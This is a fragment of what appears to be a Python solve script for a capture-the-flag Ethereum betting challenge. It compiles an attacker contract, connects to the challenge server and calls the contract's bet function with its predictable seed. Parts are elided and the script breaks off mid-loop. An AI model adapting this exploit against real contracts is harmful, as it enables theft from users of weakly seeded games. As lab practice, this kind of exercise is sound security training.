...
Bet_sol = compile_files(['./Bet.sol'], output_values = ALL_OUTPUT_VALUES)
Hack_sol = compile_files(['./Hack.sol'], output_values = ALL_OUTPUT_VALUES)

server = remote('140.112.31.97',30004)
...
BetFactory = w3.eth.contract(address = FactoryAddress, abi = Bet_sol['./Bet.sol:BetFactory']['abi'])
...
while True:
    try:
        ...
        time.sleep(1)
challenge = BetFactory.functions.instances(hackAddress).call()
print(f"Challenge Address: {hackAddress}")

hash = call(Hack.functions.bet(challenge, Hack.functions.seed().call()), 0.1)
while True:
    try:
        w3.eth.getTransactionReceipt(hash)
        break
